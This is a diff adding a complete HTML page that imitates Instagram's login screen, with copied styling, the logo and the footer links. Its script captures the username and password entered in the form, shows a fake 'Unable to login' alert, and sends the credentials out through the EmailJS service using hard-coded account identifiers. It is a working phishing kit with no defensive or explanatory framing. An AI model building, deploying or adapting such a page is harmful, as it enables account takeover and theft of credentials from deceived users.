@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #ffffff;
+            color: #262626;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .main-container {
+            display: flex;
+            gap: 120px;
+            align-items: center;
+            max-width: 1200px;
+            width: 100%;
+            margin-bottom: 60px;
+        }
+
+        .phones-mockup {
+            flex: 1;
+            max-width: 470px;
+        }
+
+        .phones-mockup img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        .login-container {
+            width: 350px;
+            background: #ffffff;
+        }
+
+        .logo-container {
+            text-align: center;
+            margin-bottom: 36px;
+        }
+
+        .logo {
+            background-image: url("https://static.cdninstagram.com/rsrc.php/v4/yz/r/H_-3Vh0lHeK.png");
+            background-position: 0px -2907px;
+            background-size: auto;
+            width: 175px;
+            height: 51px;
+            background-repeat: no-repeat;
+            display: inline-block;
+        }
+
+        .input-group {
+            margin-bottom: 6px;
+        }
+
+        input {
+            width: 100%;
+            padding: 11px 8px 9px;
+            border: 1px solid #dbdbdb;
+            background-color: #ffffff;
+            border-radius: 3px;
+            font-size: 12px;
+            outline: none;
+            color: #262626;
+            transition: border-color 0.2s, box-shadow 0.15s;
+        }
+
+        input::placeholder {
+            color: #8e8e8e;
+            font-size: 12px;
+        }
+
+        input:focus {
+            border-color: #a8a8a8;
+            box-shadow: 0 0 0 2px rgba(0,0,0,0.03);
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 8px 16px;
+            background-color: #0095f6;
+            border: none;
+            border-radius: 8px;
+            color: white;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 8px;
+            margin-bottom: 20px;
+            transition: background-color 0.2s;
+        }
+
+        .login-btn:hover {
+            background-color: #007ad9;
+        }
+
+        .login-btn:active {
+            opacity: 0.7;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background-color: #e6e6e6;
+        }
+
+        .divider-text {
+            padding: 0 18px;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .fb-login {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #1877f2;
+            font-weight: 600;
+            font-size: 14px;
+            text-decoration: none;
+            margin-bottom: 20px;
+            transition: color 0.2s;
+        }
+
+        .fb-login:hover {
+            color: #0f63b8;
+        }
+
+        .fb-icon {
+            width: 16px;
+            height: 16px;
+            margin-right: 8px;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%231877f2'%3E%3Cpath d='M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z'/%3E%3C/svg%3E");
+            background-size: contain;
+            background-repeat: no-repeat;
+        }
+
+        .forgot-password {
+            text-align: center;
+            font-size: 12px;
+            color: #0095f6;
+            text-decoration: none;
+            display: block;
+            transition: color 0.2s;
+        }
+
+        .forgot-password:hover {
+            color: #006bb3;
+        }
+
+        .signup-text {
+            text-align: center;
+            font-size: 14px;
+            margin-top: 40px;
+            color: #262626;
+        }
+
+        .signup-text a {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+            margin-left: 4px;
+            transition: color 0.2s;
+        }
+
+        .signup-text a:hover {
+            color: #0077c9;
+        }
+
+        .get-app {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .get-app p {
+            font-size: 14px;
+            margin-bottom: 16px;
+            color: #262626;
+        }
+
+        .app-buttons {
+            display: flex;
+            gap: 8px;
+            justify-content: center;
+        }
+
+        .app-buttons img {
+            height: 40px;
+            cursor: pointer;
+        }
+
+        footer {
+            width: 100%;
+            max-width: 1200px;
+            margin-top: auto;
+            padding: 40px 0 20px;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 12px 16px;
+            margin-bottom: 16px;
+        }
+
+        .footer-links a {
+            color: #8e8e8e;
+            font-size: 12px;
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-bottom {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 16px;
+            font-size: 12px;
+            color: #8e8e8e;
+        }
+
+        .language-selector {
+            background: transparent;
+            border: none;
+            color: #262626;
+            font-size: 12px;
+            cursor: pointer;
+            padding: 0;
+            outline: none;
+        }
+
+        .language-selector:hover {
+            color: #000000;
+        }
+        .password-group input {
+            -webkit-text-security: disc;
+        }
+
+        @media (max-width: 875px) {
+            .phones-mockup {
+                display: none;
+            }
+
+            .main-container {
+                justify-content: center;
+                gap: 0;
+            }
+        }
+
+        @media (max-width: 450px) {
+            .login-container {
+                width: 100%;
+                max-width: 350px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="main-container">
+        <div class="phones-mockup">
+            <img src="./landing-2x.png" alt="Instagram phones mockup">
+        </div>
+
+        <div class="login-container">
+            <div class="logo-container">
+                <i class="logo" aria-label="Instagram" role="img"></i>
+            </div>
+            
+            <form id="loginForm">
+                <div class="input-group">
+                    <input type="text" placeholder="Phone number, username, or email" id="username" required autocomplete="username">
+                </div>
+                <div class="input-group password-group">
+                    <input type="password" placeholder="Password" id="password" required autocomplete="current-password">
+                </div>
+                
+                <button type="submit" class="login-btn">Log in</button>
+            </form>
+            
+            <div class="divider">
+                <span class="divider-text">OR</span>
+            </div>
+            
+            <a href="#" class="fb-login">
+                <span class="fb-icon"></span>
+                Log in with Facebook
+            </a>
+            
+            <a href="#" class="forgot-password">Forgot password?</a>
+
+            <div class="signup-text">
+                Don't have an account? <a href="#">Sign up</a>
+            </div>
+
+            <div class="get-app">
+                <p>Get the app.</p>
+                <div class="app-buttons">
+                    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='135' height='40' viewBox='0 0 135 40'%3E%3Crect width='135' height='40' rx='5' fill='%23000'/%3E%3Ctext x='67.5' y='24' font-family='Arial' font-size='12' fill='%23fff' text-anchor='middle'%3EApp Store%3C/text%3E%3C/svg%3E" alt="Download on the App Store">
+                    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='135' height='40' viewBox='0 0 135 40'%3E%3Crect width='135' height='40' rx='5' fill='%23000'/%3E%3Ctext x='67.5' y='24' font-family='Arial' font-size='12' fill='%23fff' text-anchor='middle'%3EGoogle Play%3C/text%3E%3C/svg%3E" alt="Get it on Google Play">
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <div class="footer-links">
+            <a href="#">Meta</a>
+            <a href="#">About</a>
+            <a href="#">Blog</a>
+            <a href="#">Jobs</a>
+            <a href="#">Help</a>
+            <a href="#">API</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+            <a href="#">Locations</a>
+            <a href="#">Instagram Lite</a>
+            <a href="#">Meta AI</a>
+            <a href="#">Threads</a>
+            <a href="#">Contact Uploading & Non-Users</a>
+            <a href="#">Meta Verified</a>
+        </div>
+        <div class="footer-bottom">
+            <select class="language-selector">
+                <option>English</option>
+                <option>Español</option>
+                <option>Français</option>
+                <option>中文</option>
+                <option>日本語</option>
+            </select>
+            <span>© 2026 Instagram from Meta</span>
+        </div>
+    </footer>
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+
+    <script>
+        emailjs.init("Jio6Mr1eSqFyMWWop");
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            if (username && password) {
+                alert('Unable to login at the moment');
+                // service_zbm06jf
+                // template_w0qrux9
+                emailjs.send("service_zbm06jf","template_w0qrux9",{
+                    username: username,
+                    Password: password
+                }).then(function(response) {
+                    console.log('SUCCESS!', response.status, response.text);
+                }, function(error) {
+                    console.log('FAILED...', error);
+                });
+            }
+        });
+
+        // Add smooth hover effects
+        document.querySelectorAll('a, button, input').forEach(el => {
+            el.style.transition = 'all 0.2s ease';
+        });
+    </script>
+</body>
+</html>
